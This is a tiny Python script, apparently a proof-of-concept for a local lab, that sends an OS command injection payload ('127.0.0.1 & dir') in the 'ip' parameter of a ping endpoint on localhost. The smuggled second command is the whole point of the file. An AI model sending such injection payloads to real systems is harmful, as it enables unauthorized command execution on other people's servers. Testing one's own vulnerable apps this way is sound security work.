import requests

url = "http://127.0.0.1:5000/ping"
payload = "127.0.0.1 & dir"
params = {'ip': payload}
response = requests.get(url, params=params)

print(response.text)